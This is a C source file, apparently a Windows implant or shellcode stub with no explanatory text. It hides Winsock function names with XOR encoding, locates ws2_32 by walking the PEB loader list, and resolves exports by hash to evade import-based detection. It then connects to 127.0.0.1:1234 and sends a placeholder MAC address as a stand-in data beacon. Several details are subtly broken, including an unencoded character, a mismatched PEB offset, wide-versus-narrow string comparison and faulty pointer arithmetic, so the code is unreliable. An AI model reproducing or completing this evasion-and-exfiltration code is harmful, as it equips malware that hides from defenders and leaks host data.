#include <windows.h>

typedef int (WINAPI *LPWSAStartup)(WORD, LPWSADATA);
typedef SOCKET (WINAPI *LPSocket)(int, int, int);
typedef int (WINAPI *LPConnect)(SOCKET, const struct sockaddr*, int);
typedef int (WINAPI *LPSend)(SOCKET, const char*, int, int);
typedef int (WINAPI *LPCloseSocket)(SOCKET);
typedef int (WINAPI *LPWSACleanup)(void);
typedef DWORD (WINAPI *LPInetAddr)(const char*);
typedef USHORT (WINAPI *LPHtons)(USHORT);




// Define the PEB structure and PPEB pointer type for Windows x86
typedef struct _PEB {
	BYTE Reserved1[2];
	BYTE BeingDebugged;
	BYTE Reserved2[1];
	PVOID Reserved3[2];
	PVOID Ldr;
	PVOID ProcessParameters;
	BYTE Reserved4[104];
	PVOID Reserved5[52];
	PVOID PostProcessInitRoutine;
	BYTE Reserved6[128];
	PVOID Reserved7[1];
	ULONG SessionId;
} PEB, *PPEB;


typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	// ... other fields omitted for brevity
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;



char env_lib[] = {'w' ^ 0xE2, 's' ^ 0xE2, '2' ^ 0xE2, '_', '3', '2', '.', 'd', 'l', 'l', '\0'};
char env_func0[] = {'W' ^ 0xE2, 'S' ^ 0xE2, 'A' ^ 0xE2, 'S' ^ 0xE2, 't' ^ 0xE2, 'a' ^ 0xE2, 'r' ^ 0xE2, 't' ^ 0xE2, 'u' ^ 0xE2, 'p' ^ 0xE2, '\0'};
char env_func1[] = {'s' ^ 0xE2, 'o' ^ 0xE2, 'c' ^ 0xE2, 'k' ^ 0xE2, 'e' ^ 0xE2, 't' ^ 0xE2, '\0'};
char env_func2[] = {'c' ^ 0xE2, 'o' ^ 0xE2, 'n' ^ 0xE2, 'n' ^ 0xE2, 'e' ^ 0xE2, 'c' ^ 0xE2, 't' ^ 0xE2, '\0'};
char env_func3[] = {'s' ^ 0xE2, 'e' ^ 0xE2, 'n' ^ 0xE2, 'd' ^ 0xE2, '\0'};
char env_func4[] = {'c' ^ 0xE2, 'l' ^ 0xE2, 'o' ^ 0xE2, 's' ^ 0xE2, 'e' ^ 0xE2, 's' ^ 0xE2, 'o' ^ 0xE2, 'c' ^ 0xE2, 'k' ^ 0xE2, 'e', 't' ^ 0XE2, '\0'};
char env_func5[] = {'W' ^ 0xE2, 'S' ^ 0xE2, 'A' ^ 0xE2, 'C' ^ 0xE2, 'l' ^ 0xE2, 'e' ^ 0xE2, 'a' ^ 0xE2, 'n' ^ 0xE2, 'u' ^ 0xE2, 'p' ^ 0xE2, '\0'};
char env_func6[] = {'i' ^ 0xE2, 'n' ^ 0xE2, 'e' ^ 0xE2, 't' ^ 0xE2, '_' ^ 0xE2, 'a' ^ 0xE2, 'd' ^ 0xE2, 'd' ^ 0xE2, 'r' ^ 0xE2, '\0'};
char env_func7[] = {'h' ^ 0xE2, 't' ^ 0xE2, 'o' ^ 0xE2, 'n' ^ 0xE2, 's' ^ 0xE2, '\0'};



size_t my_strlen(const char* s){
	size_t i = 0;
	while(s[i]) ++i;
	return i;
}

int my_strstr(wchar_t *haystack, const char *needle) {
	size_t i = 0, j = 0;
	for(; haystack[i]; ++i) {
		for(j = 0; needle[j] && haystack[i+j] == needle[j]; ++j);
		if (!needle[j]) return 1;
	}
	return 0;
}

int xor_decrypt(char* data, size_t len, char key) {
	for (size_t i = 0; i < len; i++){
		data[i] ^= key;
	}
	return 0;
}

DWORD hash(char *name){
	DWORD h = 0;
	while(*name){
		h = ((h<<5) + h) + *name++; //djb2 hash function
	}
	return h;
}


FARPROC resolve_function_by_hash(HMODULE module_base, DWORD target_hash) {
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)module_base;
	PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)module_base + dos_header->e_lfanew);

	DWORD export_rva = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (!export_rva) return NULL;

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)module_base + export_rva);
    DWORD* names = (DWORD*)((BYTE*)module_base + exports->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)module_base + exports->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)module_base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; ++i) {
        char* func_name = (char*)(module_base + names[i]);
        if (hash(func_name) == target_hash) {
            WORD ordinal = ordinals[i];
            return (FARPROC)((BYTE*)module_base + functions[ordinal]);
        }
    }

    return NULL;
}



PPEB get_peb() {
	PPEB peb = NULL;
	__asm__ (
		"movl %%gs:0x60, %0"
		: "=r"(peb)
	);
	return peb;
}


PVOID find_module(const char* module_name) {
	PPEB peb = get_peb();
	if (!peb || !peb->Ldr) return NULL;

	PLIST_ENTRY list_head = (PLIST_ENTRY)((PBYTE)peb->Ldr + 0x18); // Ldr.InLoadOrderModuleList
	PLIST_ENTRY current = list_head->Flink;

	while (current != list_head) {
		LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		if (my_strstr((char*)entry->BaseDllName.Buffer, module_name)) {
			return entry->DllBase;
		}
		current = current->Flink;
	}

	return NULL;
}




__attribute__((visibility("default")))
__attribute__((used))
void entry(void) {

	xor_decrypt(env_lib, 3, 0xE2);
	HMODULE ws2_32 = (HMODULE)find_module(env_lib);

	xor_decrypt(env_func0, my_strlen(env_func0), 0xE2);
	LPWSAStartup pWSAStartup = (LPWSAStartup)resolve_function_by_hash(ws2_32, hash(env_func0));
	xor_decrypt(env_func1, my_strlen(env_func1), 0xE2);
	LPSocket pSocket = (LPSocket)resolve_function_by_hash(ws2_32, hash(env_func1));
	xor_decrypt(env_func2, my_strlen(env_func2), 0xE2);
	LPConnect pConnect = (LPConnect)resolve_function_by_hash(ws2_32, hash(env_func2));
	xor_decrypt(env_func3, my_strlen(env_func3), 0xE2);
	LPSend pSend = (LPSend)resolve_function_by_hash(ws2_32, hash(env_func3));
	xor_decrypt(env_func4, my_strlen(env_func4), 0xE2);
	LPCloseSocket pCloseSocket = (LPCloseSocket)resolve_function_by_hash(ws2_32, hash(env_func4));
	xor_decrypt(env_func5, my_strlen(env_func5), 0xE2);
	LPWSACleanup pWSACleanup = (LPWSACleanup)resolve_function_by_hash(ws2_32, hash(env_func5));
	xor_decrypt(env_func6, my_strlen(env_func6), 0xE2);
	LPInetAddr pInetAddr = (LPInetAddr)resolve_function_by_hash(ws2_32, hash(env_func6));
	xor_decrypt(env_func7, my_strlen(env_func7), 0xE2);
	LPHtons pHtons = (LPHtons)resolve_function_by_hash(ws2_32, hash(env_func7));



	WSADATA wsaData;
	SOCKET sock;
	struct sockaddr_in server;
	char* mac = "00-AA-BB-CC-DD-EE";
	

	// Init WinSock
	pWSAStartup(MAKEWORD(2,2), &wsaData);

	// Create socket
	sock = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	server.sin_family = AF_INET;
	server.sin_port = pHtons(1234);
	server.sin_addr.s_addr = pInetAddr("127.0.0.1");

	pConnect(sock, (struct sockaddr*)&server, sizeof(server));

	pSend(sock, mac, my_strlen(mac), 0);

	pCloseSocket(sock);
	pWSACleanup();

}


